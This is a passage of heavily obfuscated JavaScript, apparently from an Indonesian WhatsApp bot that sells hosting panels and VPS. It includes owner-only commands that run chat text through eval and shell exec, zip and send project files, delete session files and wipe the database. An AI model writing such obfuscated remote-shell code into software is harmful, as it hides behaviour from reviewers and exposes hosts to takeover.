                    return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x670) + _0x156b97 + (_0x5d4417(0x9cc) + _0x5d4417(0xc2b)));
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0x46e)]:
        case _0x2a5309[_0x5d4417(0x83d)]: {
                let _0x3b43ff = _0x2a5309[_0x5d4417(0x843)](speed), _0x5c5648 = _0x2a5309[_0x5d4417(0xb37)](_0x2a5309[_0x5d4417(0xeb0)](speed), _0x3b43ff), _0x23c3e0 = await nou['os'][_0x5d4417(0x107e)]();
                var _0x51a101 = await nou[_0x5d4417(0x45c)][_0x5d4417(0x1005)]();
                let _0x4d6c1e = _0x5d4417(0xba3) + _0x5d4417(0x505) + _0x5d4417(0x791) + _0x5d4417(0x19d) + nou['os'][_0x5d4417(0x5a8)]() + (_0x5d4417(0x84f) + _0x5d4417(0xac9)) + _0x2a5309[_0x5d4417(0x1076)](formatp, os[_0x5d4417(0x8e6)]()) + (_0x5d4417(0x84f) + _0x5d4417(0x695)) + _0x51a101[_0x5d4417(0x68b)] + (_0x5d4417(0xe5c) + _0x5d4417(0x365)) + os[_0x5d4417(0xdbd)]()[_0x5d4417(0xf65)] + (_0x5d4417(0x67e) + _0x5d4417(0xfaa) + _0x5d4417(0x59a)) + _0x2a5309[_0x5d4417(0x63d)](runtime, os[_0x5d4417(0x75e)]()) + (_0x5d4417(0x76d) + _0x5d4417(0x10dd) + _0x5d4417(0x51c) + _0x5d4417(0x835) + _0x5d4417(0x1151)) + _0x5c5648[_0x5d4417(0xf0e)](-0x14db + -0x2b3 * -0x9 + -0x36c) + (_0x5d4417(0xca9) + _0x5d4417(0x1055) + _0x5d4417(0xc15)) + _0x2a5309[_0x5d4417(0xf7f)](runtime, process[_0x5d4417(0x75e)]()) + '\x0a';
                await _0xedb653[_0x5d4417(0x105d)](_0x4d6c1e);
            }
            break;
        case _0x2a5309[_0x5d4417(0xcd6)]: {
                if (!_0x47f98c)
                    return;
                _0x57ed02[_0x5d4417(0x425)] = !![], _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x600)]);
            }
            break;
        case _0x2a5309[_0x5d4417(0x3bc)]:
        case _0x2a5309[_0x5d4417(0xb1c)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x541)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                await _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x1203)]);
                var _0xacddf8 = await fs[_0x5d4417(0xb04) + 'c'](_0x2a5309[_0x5d4417(0x724)]), _0x574e44 = await _0xacddf8[_0x5d4417(0xde7)](_0x63aced => _0x63aced !== _0x5d4417(0x745));
                for (let _0x589a63 of _0x574e44) {
                    await fs[_0x5d4417(0xf9e)](_0x5d4417(0xe8f) + _0x589a63);
                }
                await process[_0x5d4417(0x7e6)](_0x2a5309[_0x5d4417(0xafc)]);
            }
            break;
        case _0x2a5309[_0x5d4417(0x685)]:
        case _0x2a5309[_0x5d4417(0x1c2)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x7a0)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xecc)](_0x1ac933, _0x2a5309[_0x5d4417(0xe5e)]));
                await _0x57ed02[_0x5d4417(0x367) + 'e'](idSaluran, { 'text': _0x156b97 }), _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xe14)]);
            }
            break;
        case _0x2a5309[_0x5d4417(0xf17)]:
        case _0x2a5309[_0x5d4417(0x95f)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x54f)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xa04)](_0x1ac933, _0x2a5309[_0x5d4417(0xc85)]));
                if (!/image/[_0x5d4417(0x8cc)](_0x5a9802))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xc4d)](_0x1ac933, _0x2a5309[_0x5d4417(0xc85)]));
                let _0x76114d = await _0x57ed02[_0x5d4417(0x107b) + _0x5d4417(0x556) + _0x5d4417(0x37b)](_0x597f08);
                await _0x57ed02[_0x5d4417(0x367) + 'e'](idSaluran, {
                    'image': await fs[_0x5d4417(0xf73) + 'nc'](_0x76114d),
                    'caption': _0x156b97
                }), _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xb69)]), await fs[_0x5d4417(0xf9e)](_0x76114d);
            }
            break;
        case _0x2a5309[_0x5d4417(0x97e)]: {
                if (_0x2a5309[_0x5d4417(0x9bf)](_0xedb653[_0x5d4417(0xeee)][_0x5d4417(0xc6c)]('@')[0x3 * -0x6bb + -0x850 + 0x1c81], global[_0x5d4417(0x41d)]) && _0x2a5309[_0x5d4417(0x7ff)](_0xedb653[_0x5d4417(0xeee)], _0x4815f3))
                    return _0x2a5309[_0x5d4417(0xb64)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                let _0x1c866c = await fs[_0x5d4417(0xb04) + 'c'](_0x2a5309[_0x5d4417(0x96d)]);
                if (_0x2a5309[_0x5d4417(0x4b9)](_0x1c866c[_0x5d4417(0xf65)], -0x24f4 + -0x67d + -0x635 * -0x7)) {
                    let _0x116a5c = _0x1c866c[_0x5d4417(0xde7)](_0x389bea => _0x389bea !== 'A');
                    for (let _0x5d51cd of _0x116a5c) {
                        await fs[_0x5d4417(0xf9e)](_0x5d4417(0x1f7) + _0x5d4417(0xc2a) + _0x5d4417(0x108b) + _0x5d51cd);
                    }
                }
                await _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xa8f)]);
                var _0x55d64e = _0x5d4417(0x274) + _0x5d4417(0xa93);
                const _0x112a3b = (await _0x2a5309[_0x5d4417(0x24f)](execSync, 'ls'))[_0x5d4417(0xef4)]()[_0x5d4417(0xc6c)]('\x0a')[_0x5d4417(0xde7)](_0x340574 => _0x340574 != _0x5d4417(0x693) + 'es' && _0x340574 != _0x5d4417(0xfef) && _0x340574 != _0x5d4417(0x436) + _0x5d4417(0x6bd) && _0x340574 != _0x5d4417(0xa70) && _0x340574 != ''), _0x28cb94 = await _0x2a5309[_0x5d4417(0x985)](execSync, _0x5d4417(0x601) + _0x55d64e + _0x5d4417(0x10c2) + _0x112a3b[_0x5d4417(0x8b2)]('\x20'));
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0xeee)], {
                    'document': await fs[_0x5d4417(0xf73) + 'nc']('./' + _0x55d64e + _0x5d4417(0x956)),
                    'fileName': _0x55d64e + _0x5d4417(0x956),
                    'mimetype': _0x2a5309[_0x5d4417(0x4e7)]
                }, { 'quoted': _0xedb653 }), await _0x2a5309[_0x5d4417(0x4b4)](execSync, _0x5d4417(0x6ad) + _0x55d64e + _0x5d4417(0x956));
                if (_0x2a5309[_0x5d4417(0x28e)](_0xedb653[_0x5d4417(0x9e2)], _0xedb653[_0x5d4417(0xeee)]))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xbec)]);
            }
            break;
        case _0x2a5309[_0x5d4417(0x2a3)]:
        case _0x2a5309[_0x5d4417(0x808)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x342)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                for (let _0x27fcad of Object[_0x5d4417(0x1af)](global['db'])) {
                    global['db'][_0x27fcad] = {};
                }
                _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x33a)]);
            }
            break;
        case _0x2a5309[_0x5d4417(0xf29)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x10b1)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (/image/g[_0x5d4417(0x8cc)](_0x5a9802)) {
                    var _0x3295e2 = await _0x57ed02[_0x5d4417(0x107b) + _0x5d4417(0x556) + _0x5d4417(0x37b)](_0x597f08);
                    if (_0x5c5935[0x8e5 + 0xf6e + -0x1853] && _0x2a5309[_0x5d4417(0x545)](_0x5c5935[0x1038 + 0x151 * 0x1c + -0xac * 0x4f], _0x2a5309[_0x5d4417(0x26a)])) {
                        const {img: _0x2fb8fd} = await _0x2a5309[_0x5d4417(0xb77)](generateProfilePicture, _0x3295e2);
                        await _0x57ed02[_0x5d4417(0xa73)]({
                            'tag': 'iq',
                            'attrs': {
                                'to': _0x4815f3,
                                'type': _0x2a5309[_0x5d4417(0xbd2)],
                                'xmlns': _0x2a5309[_0x5d4417(0x43a)]
                            },
                            'content': [{
                                    'tag': _0x2a5309[_0x5d4417(0xe90)],
                                    'attrs': { 'type': _0x2a5309[_0x5d4417(0xc0d)] },
                                    'content': _0x2fb8fd
                                }]
                        }), await fs[_0x5d4417(0xf9e)](_0x3295e2), _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xeb9)]);
                    } else
                        await _0x57ed02[_0x5d4417(0xec9) + _0x5d4417(0xdcc)](_0x4815f3, { 'content': _0x3295e2 }), await fs[_0x5d4417(0xf9e)](_0x3295e2), _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xeb9)]);
                } else
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x103e)](_0x1ac933, _0x2a5309[_0x5d4417(0x1006)]));
            }
            break;
        case _0x2a5309[_0x5d4417(0x419)]:
        case _0x2a5309[_0x5d4417(0xc93)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xe91)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                _0x57ed02[_0x5d4417(0xfbc)]({
                    'delete': !![],
                    'lastMessages': [{
                            'key': _0xedb653[_0x5d4417(0x1185)],
                            'messageTimestamp': _0xedb653[_0x5d4417(0xd10)]
                        }]
                }, _0xedb653[_0x5d4417(0x9e2)]);
            }
            break;
        case _0x2a5309[_0x5d4417(0x895)]:
        case _0x2a5309[_0x5d4417(0x5a7)]: {
                if (_0x2a5309[_0x5d4417(0xd18)](owners[_0x5d4417(0xf65)], -0x7 * 0x4c7 + -0xf4 * 0x16 + -0x18e * -0x23))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x921)]);
                let _0x14fa52 = _0x5d4417(0x88c) + _0x5d4417(0x8ba) + _0x5d4417(0x80d);
                for (let _0x4bbf3a of owners) {
                    _0x14fa52 += _0x5d4417(0x56a) + _0x4bbf3a[_0x5d4417(0xc6c)]('@')[0x7 * -0x394 + 0x24f3 + -0xbe7] + (_0x5d4417(0x517) + '\x20@') + _0x4bbf3a[_0x5d4417(0xc6c)]('@')[0x2b * -0x27 + -0x30 * -0x9d + -0x16e3] + '\x0a';
                }
                _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'text': _0x14fa52,
                    'mentions': owners
                }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x915)]:
        case _0x2a5309[_0x5d4417(0x32f)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x4c5)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0xedb653[_0x5d4417(0x7eb)] && !_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xe29)](_0x1ac933, _0x2a5309[_0x5d4417(0xfe8)]));
                const _0x513489 = _0xedb653[_0x5d4417(0x7eb)] ? _0xedb653[_0x5d4417(0x7eb)][_0x5d4417(0xeee)] : _0x2a5309[_0x5d4417(0xb73)](_0x156b97[_0x5d4417(0xe51)](/[^0-9]/g, ''), _0x2a5309[_0x5d4417(0x11a3)]), _0x36f52d = _0x513489[_0x5d4417(0xc6c)]('@')[-0x9e8 + 0x83 * -0x15 + 0x14a7];
                if (_0x2a5309[_0x5d4417(0x827)](_0x36f52d, global[_0x5d4417(0x41d)]) || _0x2a5309[_0x5d4417(0x1096)](_0x513489, _0x4815f3))
                    return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xee8) + _0x5d4417(0x58b) + _0x5d4417(0xd7d) + _0x5d4417(0xc53));
                if (!owners[_0x5d4417(0x3d3)](_0x513489))
                    return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xa86) + _0x36f52d + (_0x5d4417(0x7d9) + _0x5d4417(0x1058)));
                let _0x567c8a = owners[_0x5d4417(0x872)](_0x513489);
                await owners[_0x5d4417(0xa5a)](_0x567c8a, 0x208c + -0x78a + -0x1901), await fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x2a5309[_0x5d4417(0xf24)], JSON[_0x5d4417(0x78f)](owners, null, 0x399 * 0x8 + -0x23a * 0xd + 0x2c)), _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x11b9) + _0x5d4417(0x88b) + _0x5d4417(0x36f));
            }
            break;
        case _0x2a5309[_0x5d4417(0xe8e)]:
        case _0x2a5309[_0x5d4417(0x1177)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xf20)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0xedb653[_0x5d4417(0x7eb)] && !_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x5ab)](_0x1ac933, _0x2a5309[_0x5d4417(0xfe8)]));
                const _0x342680 = _0xedb653[_0x5d4417(0x7eb)] ? _0xedb653[_0x5d4417(0x7eb)][_0x5d4417(0xeee)] : _0x2a5309[_0x5d4417(0x3f4)](_0x156b97[_0x5d4417(0xe51)](/[^0-9]/g, ''), _0x2a5309[_0x5d4417(0x11a3)]), _0x19cbfd = _0x342680[_0x5d4417(0xc6c)]('@')[0x94b * -0x1 + 0xad2 + -0x187];
                if (_0x2a5309[_0x5d4417(0x3c9)](_0x19cbfd, global[_0x5d4417(0x41d)]) || owners[_0x5d4417(0x3d3)](_0x342680) || _0x2a5309[_0x5d4417(0xc79)](_0x342680, _0x4815f3))
                    return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xa86) + _0x19cbfd + (_0x5d4417(0x516) + _0x5d4417(0xd4b) + _0x5d4417(0xb34)));
                owners[_0x5d4417(0x706)](_0x342680), await fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x2a5309[_0x5d4417(0xf24)], JSON[_0x5d4417(0x78f)](owners, null, 0x176c * -0x1 + 0x3d * -0x3a + 0x2540)), _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x11b9) + _0x5d4417(0x833) + _0x5d4417(0x110d));
            }
            break;
        default:
            if (_0x4646be[_0x5d4417(0x5cc)]('>')) {
                if (!_0x47f98c)
                    return;
                try {
                    let _0x519880 = await _0x2a5309[_0x5d4417(0x4a6)](eval, _0x4646be[_0x5d4417(0x1019)](-0x295 * 0xb + -0x91 * 0x3d + -0x1 * -0x3ef6));
                    if (_0x2a5309[_0x5d4417(0x11e1)](typeof _0x519880, _0x2a5309[_0x5d4417(0xccb)]))
                        _0x519880 = _0x2a5309[_0x5d4417(0xeaa)](require, _0x2a5309[_0x5d4417(0x819)])[_0x5d4417(0x537)](_0x519880);
                    await _0xedb653[_0x5d4417(0x105d)](_0x519880);
                } catch (_0x53dade) {
                    await _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xdde)](String, _0x53dade));
                }
            }
            _0x2a5309[_0x5d4417(0xb41)](_0xedb653[_0x5d4417(0x22d)][_0x5d4417(0xec1) + 'e'](), _0x2a5309[_0x5d4417(0x912)]) && _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x6ef)]);
            if (_0x4646be[_0x5d4417(0x5cc)]('=>')) {
                if (!_0x47f98c)
                    return;
                try {
                    let _0x12b86d = await _0x2a5309[_0x5d4417(0xecc)](eval, _0x5d4417(0x1001) + _0x5d4417(0x2d0) + _0x4646be[_0x5d4417(0x1019)](-0x5 * 0x2fd + 0xfee * 0x1 + -0xfb) + _0x5d4417(0x77b));
                    if (_0x2a5309[_0x5d4417(0xaf4)](typeof _0x12b86d, _0x2a5309[_0x5d4417(0xccb)]))
                        _0x12b86d = _0x2a5309[_0x5d4417(0xa18)](require, _0x2a5309[_0x5d4417(0x819)])[_0x5d4417(0x537)](_0x12b86d);
                    await _0xedb653[_0x5d4417(0x105d)](_0x12b86d);
                } catch (_0x19ba56) {
                    await _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x61f)](String, _0x19ba56));
                }
            }
            if (_0x4646be[_0x5d4417(0x5cc)]('$')) {
                if (!_0x47f98c)
                    return;
                if (!_0x156b97)
                    return;
                _0x2a5309[_0x5d4417(0x9c3)](exec, _0x4646be[_0x5d4417(0x1019)](-0x132d + -0x1 * 0x1f2 + 0x3 * 0x70b), (_0x455d00, _0x139044) => {
                    const _0x3f235f = _0x5d4417;
                    if (_0x455d00)
                        return _0xedb653[_0x3f235f(0x105d)]('' + _0x455d00);
                    if (_0x139044)
                        return _0xedb653[_0x3f235f(0x105d)](_0x139044);
                });
            }
        }
    } catch (_0xdc5b3f) {
        console[_0x5d4417(0xd16)](util[_0x5d4417(0x9ce)](_0xdc5b3f));
        let _0x337836 = global[_0x5d4417(0x41d)];
        _0x57ed02[_0x5d4417(0x367) + 'e'](_0x2a5309[_0x5d4417(0x776)](_0x337836, _0x2a5309[_0x5d4417(0x928)]), {
            'text': _0x5d4417(0xb3c) + _0x5d4417(0x2eb) + _0x5d4417(0x112c) + _0x5d4417(0x6b6) + _0x5d4417(0xdae) + _0x5d4417(0x59a) + (isCmd ? _0x2a5309[_0x5d4417(0x7d8)](prefix, command) : _0xedb653[_0x5d4417(0x22d)]) + (_0x5d4417(0x6fd) + _0x5d4417(0xf40) + _0x5d4417(0xc63)) + util[_0x5d4417(0x9ce)](_0xdc5b3f),
            'contextInfo': { 'isForwarded': !![] }
        }, { 'quoted': _0xedb653 });
    }
};
let file = require[_0x5b27a8(0x5ea)](__filename);
function _0x4f4e(_0xa758ca, _0x313397) {
    const _0x5334a0 = _0x7820();
    return _0x4f4e = function (_0x3af213, _0x2a7074) {
        _0x3af213 = _0x3af213 - (-0x1b53 + -0x157 * -0x15 + -0xb3 * -0x1);
        let _0x3c504b = _0x5334a0[_0x3af213];
        return _0x3c504b;
    }, _0x4f4e(_0xa758ca, _0x313397);
}
function _0x7820() {
    const _0x116979 = [
        'ema\x20enigma',
        '━━\x0a│\x20↝\x20ɴᴀᴍ',
        '\x20di\x20grup\x20i',
        '\x0a│\x20↝\x20.ᴅᴇʟᴀ',
        '\x20Ketahuan\x20',
        '472396SrSKuH',
        'ᴍᴇɴᴜ`\x20\x20━━━',
        'username',
        '━\x0a│\x20↝\x20.ᴀᴅᴅ',
        'JHlAc',
        'Do\x20you\x20wan',
        'DkVzj',
        'ɴ\x0a│\x20↝\x20.ᴅᴇʟ',
        'ZdOcZ',
        '\x0a*\x20*Domain',
        'tourl',
        'ner\x20✅',
        'wxMYf',
        'VFULF',
        '4gb\x20',
        'all.sh)',
        '\x0a*\x20*Nama\x20A',
        'Online\x20Kak',
        'GnFAX',
        'OcnWv',
        'IVrNT',
        'PCWov',
        'tagall',
        'content',
        'oxCzp',
        'ByMhc',
        '*•\x20ID\x20:*\x20',
        'SI\x20CLOUDFL',
        'atalbeli*\x20',
        'leHhv',
        'ker',
        'pKiFw',
        'stikerwm',
        'ail\x20akun\x20a',
        'xtwhM',
        'fEhKm',
        'ESKrI',
        'drbGm',
        'mhdbH',
        '3|0|4|2|1',
        'Ram\x202GB\x20||',
        'GET',
        'lah\x20terjad',
        '━━━━━━━\x0a\x0a┏',
        'rodactyl\x0a',
        'XMHcm',
        'ᴍɪᴛᴇᴅ-ᴠ2\x20\x0a',
        '6285840351',
        '📦\x20',
        'pushkontak',
        'sendAsStic',
        'ʟɪsᴛᴅʀᴏᴘʟᴇ',
        'tVvtO',
        'tentuan\x20:*',
        'AchGM',
        'trfvB',
        '↝\x20.ʟɪsᴛᴏᴡɴ',
        '*Autopromo',
        'yaran\x20kamu',
        '//t.me/-st',
        'templateMe',
        '\x20↝\x20ᴅʜɪʟᴢ\x20<',
        'cadmin-v2',
        'cEfvq',
        'YkENA',
        '*\x0a*\x20Create',
        '⌜\x20𝗥𝘆𝘇𝘇𝗜𝘀𝗛𝗲',
        'apiOrderKu',
        '\x20ke\x20dalam\x20',
        'uWPiS',
        'yl\x0a\x20*•\x20Exp',
        'e\x20initial\x20',
        'Error!\x20Res',
        'ylGoc',
        'wxutI',
        '━\x0a\x0a┏━━━━━\x20',
        'l.com\x0a',
        'ᴀɴɴᴇʟ\x20ᴅᴇᴠᴇ',
        '│\x20↝\x20.sᴇᴛɪᴍ',
        ':*\x20',
        'will\x20be\x20br',
        'pembayaran',
        'xmAhK',
        'n\x20Panel',
        'n\x20:*\x20',
        'https://fg',
        '\x20Panel\x20Kam',
        'ipvps|pwvp',
        'nel\x20&\x20',
        '_*:\x20https:',
        'FN:Buyer\x20S',
        'fVKAF',
        '@s.whatsap',
        'akai:\x20',
        '35000',
        't.my.id/ap',
        'hex',
        'CPU\x20180%',
        'hbWfr',
        'ICgRS',
        'ᴏᴛ\x0a│\x20↝\x20.ɢᴇ',
        'l.txt',
        'Masukkan\x20d',
        'krzqF',
        'remini',
        'ᴅᴍɪɴ\x0a│\x20↝\x20.',
        'CPU\x20200%',
        'erver\x20Pane',
        'ᴏ\x20<\x20sᴜᴘᴘᴏʀ',
        '\x20\x0a│\x20↝\x20.ᴍᴇᴅ',
        'LlWUZ',
        'Rp15.000',
        'yxzIm',
        'rmed\x20(y/N)',
        'rjRhw',
        'tak',
        'xwnNX',
        'tZXmW',
        'om/repos/',
        'HJiQZ',
        'znYvU',
        'lriGX',
        'KOnxP',
        '│\x20↝\x20.7ɢʙ-ᴠ',
        'documentMe',
        't\x20is\x20perfo',
        'Panel\x20Pter',
        'testi',
        'IYKsZ',
        '↝\x20.ᴘɪɴᴛᴇʀᴇ',
        'Pilih\x20Ram\x20',
        'key',
        'nstall\x20*te',
        'ifikasi\x20st',
        'google-api',
        'DZkCM',
        'mfKGr',
        'jRzwp',
        'ᴇʀ\x0a│\x20↝\x20.ᴄᴘ',
        'lai.\x20Statu',
        '*\x20Choose\x20t',
        'HKswZ',
        'lid',
        'PANEL\x204GB',
        'VdeZV',
        'success',
        '│\x20↝\x20.ᴛᴀɢᴀʟ',
        'pi/search/',
        'deladmin-v',
        'eQGqf',
        '\x20and\x20Ptero',
        'Ram\x20Unlimi',
        'Terjadi\x20ke',
        'Hssmr',
        'IHaya',
        'an\x0a',
        '*乂\x20Link\x20Gr',
        'ePMoG',
        'lmVal',
        'l\x20✅',
        'n\x20kamu.\x0a\x0aK',
        'duOgd',
        'pt\x20Bot\x20Yan',
        '𝘀𝗛𝗲𝗿𝗲*\x20Men',
        'Baik,\x20Saya',
        'droplets',
        'ᴛᴏᴜʀʟ2\x0a│\x20↝',
        'WTXqF',
        'qeaoe',
        'qyFTC',
        ',\x20ᴄʀᴇᴀᴛᴇᴅ\x20',
        'Berhasil\x20M',
        '1|0|4|2|3',
        'waitR',
        'LBCYO',
        'ta\x20ini\x20seb',
        'ubfhB',
        '.js',
        'i/orkut/cr',
        'VZTCm',
        'wHtFS',
        'chalk',
        'Wings\x0a\x0a*Ca',
        'Berhasil\x20m',
        'gRxAX',
        'yl\x20✅',
        'botAdmin',
        'dNQpi',
        '`\x0a\x0a*[\x20!\x20]\x20',
        'EqIfV',
        'qGDLG',
        ':\x20https://',
        '\x0a\x0a*[\x20!\x20]\x20P',
        '.buysc\x203',
        'ᴇᴛᴄᴀsᴇ\x0a│\x20↝',
        'ᴇɴɪᴛ\x20ᴀɢᴀʀ\x20',
        'XFfjH',
        '/main/crea',
        'IjWhy',
        'CPU\x20100%',
        'shopepay',
        'upchannel2',
        '𝗥𝗔𝗡𝗚𝗔𝗡\x0a>\x20𝖲',
        'ᴇsᴛ\x20ғʀɪᴇɴᴅ',
        'XZqTZ',
        'xHEdL',
        'Error',
        '\x20hasil\x20pen',
        '(yes/no)',
        '━━\x0a│\x20↝\x20.ʜᴀ',
        'et\x20digital',
        'UuyEm',
        'anya\x20berla',
        'ᴀᴍᴇ\x20:\x20',
        'RZSbE',
        '9gb\x20',
        'swm',
        'Berhasil\x20i',
        'QEJei',
        'eatepaymen',
        'Admin',
        'Encrypt\x20(n',
        '\x20Maaf\x20pesa',
        'ifzCO',
        '\x20↝\x20.ʟɪsᴛʀᴇ',
        'rprlN',
        'S\x20setelah\x20',
        'fbdl',
        'to\x20cancel)',
        'urOht',
        'am\x207\x20GB\x20:\x20',
        'listproduk',
        'p2n\x0a',
        '*\x20pterodac',
        'Pilih\x20Targ',
        'DBPVi',
        '*\x0a┗*\x20',
        'UHmso',
        '\x20selsai',
        '*autoread*',
        'RUSUi',
        '\x20menit\x20hin',
        'kFlAd',
        'rsama```\x0a',
        'buysc',
        'ᴋᴇʀᴡᴍ\x0a│\x20↝\x20',
        'ownername',
        'ᴏɴ\x20:\x20𝟭.𝟬\x0a│',
        'uHPOo',
        'aransi\x20pem',
        'n/vnd.open',
        'Pilih\x20Scri',
        'JUlDk',
        '\x20:*\x0a*\x20*Use',
        'GtkAf',
        'rim\x20foto',
        'KjDqP',
        'CtEQd',
        'tpHNm',
        '\x0aKetik\x20*.b',
        '𝐧𝐞𝐥',
        'i.github.c',
        'anel',
        'close',
        'lVQMJ',
        '`ᴅᴏᴡɴʟᴏᴀᴅ\x20',
        'HlhNU',
        'cement',
        'gu\x20tidak\x20d',
        'teks\x20denga',
        '*jpm*\x20test',
        '𝗔𝗡𝗚𝗔𝗡\x0a>\x20𝖲𝖯',
        'DISkG',
        'ejNWI',
        'DXebe',
        'lid!\x0aJika\x20',
        'Ocean',
        'ʀᴇᴀᴅ\x0a│\x20↝\x20.',
        'verificati',
        'moment-tim',
        'roses\x20sels',
        'FFizI',
        '\x0a*\x20ID\x20:\x20*',
        'D\x20:*\x20',
        'oEizR',
        '23922xeoGsW',
        '2\x0a│\x20↝\x20.8ɢʙ',
        'ation\x20&\x20Am',
        'mbatalkan\x0a',
        'ereset\x20lin',
        'DjKtj',
        '*jpm*\x20teks',
        'XIhqK',
        'getscreens',
        'e\x20email\x20ad',
        'atform\x20:*\x20',
        '┗━━━━━━━━━',
        'ɪᴍɪ\x20<\x20ᴍʏ\x20ʙ',
        'or\x20the\x20ini',
        'nwings\x0a',
        'Ram\x2016\x20&\x20C',
        't\x20Untuk\x20Me',
        'erlaku\x20dal',
        'YuQUw',
        '│\x20↝\x20.ʟɪsᴛᴘ',
        '\x20tidak\x20akt',
        'case\x20',
        'owner\x20tamb',
        '\x0a*\x20*Shortl',
        'hapus\x20drop',
        '\x20:*\x205\x20meni',
        'etPzr',
        'OmyAt',
        'keys',
        'catch',
        '\x20private\x20c',
        'aenigma',
        'EuNGL',
        '\x20EVOURTH\x0a>',
        'i/orkut/ce',
        './case.js',
        '*antilink2',
        'ByySF',
        's\x20>\x0a│\x20↝\x20ᴠᴇ',
        'droplet',
        'ONJhP',
        'UPNKe',
        'eAOfV',
        'once!',
        'Ipflb',
        'sposition',
        'uvrzw',
        'RTIJQ',
        'messageCon',
        'ᴋᴀɴ\x20ᴅɪ\x20ᴄʜᴀ',
        'admin\x0a',
        '.shopepay',
        'QGnnG',
        'Unlimited',
        'ᴜɪʟᴅ\x0a│\x20↝\x20.',
        'eJdsQ',
        'e\x20mode\x20*se',
        'ult\x20Not\x20Fo',
        't\x0a\x0a*Note\x20:',
        'gJCGl',
        'de\x20.\x20.\x20.',
        'menit\x0a\x0a*No',
        'yURFR',
        'terodactyl',
        'ᴋ\x20ᴍᴇʟᴀʏᴀɴɪ',
        'GYXaz',
        'nel.exampl',
        '\x0a*PAYMENT\x20',
        'Uksxj',
        '━━━━━━━━━\x0a',
        'mIcPt',
        'ner\x20Sedang',
        'KKtEG',
        'SNObt',
        'iMVAF',
        '━\x20\x20`ᴘᴀɴᴇʟ\x20',
        'WQezF',
        'elewati\x205\x20',
        '?*\x0a\x0a*CONTA',
        'Masih\x20ada\x20',
        '.ᴊᴘᴍᴛᴇsᴛɪ\x0a',
        'rd\x20code\x20.\x20',
        'TgNYw',
        'axios',
        'Testimoni\x20',
        'delete',
        'Password:\x20',
        'jAMJh',
        'RbsGg',
        '.respushko',
        'TmXUH',
        '\x20will\x20be\x20u',
        'embelian\x0a',
        '\x20Anda.',
        'fRExj',
        'redBright',
        'ᴜᴋ\x0a┗━━━━━━',
        'sed\x20to\x20con',
        'ris\x20diatas',
        '│\x20↝\x20.ʙʟᴀᴄᴋ',
        './library/',
        '2gb\x20',
        'RAM\x208GB\x20|\x20',
        'mit',
        'eNDoo',
        'PzZhG',
        'action',
        '\x20.ɢɪᴛᴄʟᴏɴᴇ',
        'processing',
        '\x20sudah\x20ada',
        'EAACN',
        'NdJqd',
        'JmKFJ',
        'ak\x20ditemuk',
        '000\x0a\x0a*\x20Ram',
        'zEikb',
        'ur\x20antilin',
        'ivWgd',
        'k\x20terdafta',
        '━━━\x0a\x0a┏━━━━',
        '5|1|7|4|6|',
        'ARE\x20\x0a\x0a*WAN',
        'add',
        'l\x20pterodac',
        '4\x20GB\x20:\x20Rp4',
        'CwwaY',
        '.ʟɪsᴛᴘᴀɴᴇʟ',
        'Rp11000',
        '\x20kualitas\x20',
        'YUSXXXXX``',
        'RbLxL',
        'VjQyV',
        'END:VCARD',
        'ᴠ2\x0a│\x20↝\x20.ᴅᴇ',
        'vps...',
        'kqmQL',
        '/*𝗥𝘆𝘇𝘇𝗜𝘀𝗛𝗲',
        'ɪɴsᴛᴀʟʟᴛᴇᴍ',
